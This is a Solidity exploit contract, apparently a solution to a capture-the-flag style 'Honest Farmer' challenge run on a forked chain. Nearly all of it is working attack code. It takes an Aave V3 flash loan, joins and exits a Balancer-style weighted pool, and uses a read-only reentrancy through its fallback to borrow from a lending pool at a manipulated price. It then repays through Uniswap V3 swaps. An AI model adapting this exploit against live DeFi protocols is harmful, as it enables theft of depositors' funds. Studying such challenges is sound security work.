// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import {LendingPool} from "src/honest-farmer/LendingPool.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IVaultA {
    function getPoolTokens(bytes32) external view returns (address[] memory, uint256[] memory, uint256);
    function flashLoan(address,address[] memory,uint256[] memory,bytes memory) external;
    function joinPool(
        bytes32 poolId,
        address sender,
        address recipient,
        JoinPoolRequest memory request
    ) external payable;
    function exitPool(
        bytes32 poolId,
        address sender,
        address recipient,
        JoinPoolRequest memory request
    ) external payable;
    struct JoinPoolRequest {
        address[] assets;
        uint256[] maxAmountsIn;
        bytes userData;
        bool fromInternalBalance;
    }

    function getInternalBalance(address,address[] memory) external view returns (uint256[] memory);
}

interface IW {
    function withdraw(uint256) external;
    function deposit() payable external;
}

interface AV3 {
    function flashLoanSimple(address,address,uint256,bytes memory,uint16) external;
    function flashLoan(address,address[] memory,uint256[] memory, uint256[] memory, address,bytes memory,uint16) external;
}

interface IV3 {
    function exactOutputSingle(ExactOutputSingleParams memory params)
        external
        payable;

    struct ExactOutputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountOut;
        uint256 amountInMaximum;
        uint160 sqrtPriceLimitX96;
    }
}

contract TokenSaver {
    function go() external {
        IERC20 x = IERC20(0x64541216bAFFFEec8ea535BB71Fbc927831d0595);
        x.transfer(msg.sender, x.balanceOf(address(this)));
    }
}

contract Attacker {

    event log(string a1, uint256 a2);
    LendingPool private immutable _lendingPool;

    constructor(LendingPool _pool) {
        _lendingPool = _pool;
    }

    function executeAttack() external {
        // forge test -vvvvv --match-contract 'HonestFarmerChallenge'



        // IVaultA(address(_lendingPool.vault())).flashLoan(
        //     address(this),
        //     tokens,
        //     amounts,
        //     hex""
        // );

        // get a flashloan from aavev3



        address aavev3 = 0x794a61358D6845594F94dc1DB02A252b5b4814aD;
        // aavev3 = 0xF4B1486DD74D07706052A33d31d7c0AAFD0659E1;

        uint256 wb = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1).balanceOf(0xe50fA9b3c56FfB159cB0FCA61F5c9D750e8128c8);

        // AV3(aavev3).flashLoanSimple(
        //     address(this),
        //     address(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1), // WETH
        //     1_00 ether,
        //     hex"",
        //     0
        // );

        (address[] memory tokens, uint[] memory balances, ) = IVaultA(address(_lendingPool.vault())).getPoolTokens(0x64541216bafffeec8ea535bb71fbc927831d0595000100000000000000000002);

        for (uint i=0;i<3;i++) {
            balances[i] = balances[i] * 500 / 100; // 5x (optimal value)
        }

        uint256[] memory inter = new uint256[](3);


        AV3(aavev3).flashLoan(
            address(this),
            tokens,
            balances,
            inter,
            address(this),
            hex"",
            0
        );

    }

    uint stage = 0;
    TokenSaver t;
    uint256 requiredBTC;
    uint256 requiredUSDC;

    function executeOperation(address[] memory tokens, uint256[] memory borrowed, uint256[] calldata premium, address r, bytes calldata) external returns (bool) {
        requiredBTC = borrowed[0] + premium[0];
        requiredUSDC = borrowed[2] + premium[2];

        for (uint i=0;i<3; i++) {
            IERC20(tokens[i]).approve(0xBA12222222228d8Ba445958a75a0704d566BF2C8, type(uint256).max);
        }

        IVaultA.JoinPoolRequest memory jpr = IVaultA.JoinPoolRequest(
            tokens,
            borrowed,
            abi.encode(uint256(1), borrowed, uint256(0)),
            false
        );

        IVaultA(address(_lendingPool.vault())).joinPool(
            0x64541216bafffeec8ea535bb71fbc927831d0595000100000000000000000002,
            address(this),
            address(this),
            jpr
        );



        tokens[1] = address(0);
        borrowed[0] = 0;
        borrowed[1] = 0;
        borrowed[2] = 0;

        jpr.assets = tokens;

        t = new TokenSaver();
        { // avoid stack thing
        uint a = _lendingPool.getDepositRequired(10 ether);

        IERC20(0x64541216bAFFFEec8ea535BB71Fbc927831d0595).transfer(address(t), 30 ether); // hard-coded

        uint sb = IERC20(0x64541216bAFFFEec8ea535BB71Fbc927831d0595).balanceOf(address(this));
        jpr.userData = abi.encode(uint256(1), sb, uint256(1));

        IVaultA(address(_lendingPool.vault())).exitPool(
            0x64541216bafffeec8ea535bb71fbc927831d0595000100000000000000000002,
            address(this),
            address(this),
            jpr
        );

        IW(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1).deposit{value: address(this).balance}();
        }

        {
        // get remains
        tokens[1] = address(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
        uint sb = IERC20(0x64541216bAFFFEec8ea535BB71Fbc927831d0595).balanceOf(address(this));
        jpr.userData = abi.encode(uint256(1), sb, uint256(1));

        IVaultA(address(_lendingPool.vault())).exitPool(
            0x64541216bafffeec8ea535bb71fbc927831d0595000100000000000000000002,
            address(this),
            address(this),
            jpr
        );
        }

        address v3pool = 0x2f5e87C9312fa29aed5c179E456625D79015299c; // BTC <> WETH
        IV3 v3Router = IV3(0xE592427A0AEce92De3Edee1F18E0157C05861564);

        IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1).approve(address(v3Router), type(uint256).max);
        // allow aave
        IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f).approve(address(0x794a61358D6845594F94dc1DB02A252b5b4814aD), type(uint256).max);
        IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1).approve(address(0x794a61358D6845594F94dc1DB02A252b5b4814aD), type(uint256).max);
        IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8).approve(address(0x794a61358D6845594F94dc1DB02A252b5b4814aD), type(uint256).max);

        v3Router.exactOutputSingle(IV3.ExactOutputSingleParams(
            0x82aF49447D8a07e3bd95BD0d56f35241523fBab1,
            tokens[0],
            500,
            address(this),
            type(uint256).max,
            requiredBTC -  IERC20(tokens[0]).balanceOf(address(this)),
            type(uint256).max,
            0
        ));

        // 0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443
        v3Router.exactOutputSingle(IV3.ExactOutputSingleParams(
            0x82aF49447D8a07e3bd95BD0d56f35241523fBab1,
            tokens[2],
            500,
            address(this),
            type(uint256).max,
            requiredUSDC - IERC20(tokens[2]).balanceOf(address(this)),
            type(uint256).max,
            0
        ));
        return true;
    }

    fallback() external payable {
        if (stage == 0) {
            // read only reentrancy
            stage++;

            IERC20(0x64541216bAFFFEec8ea535BB71Fbc927831d0595).approve(address(_lendingPool), type(uint256).max);
            t.go();
            _lendingPool.borrow(10 ether, address(this));
        }
    }
}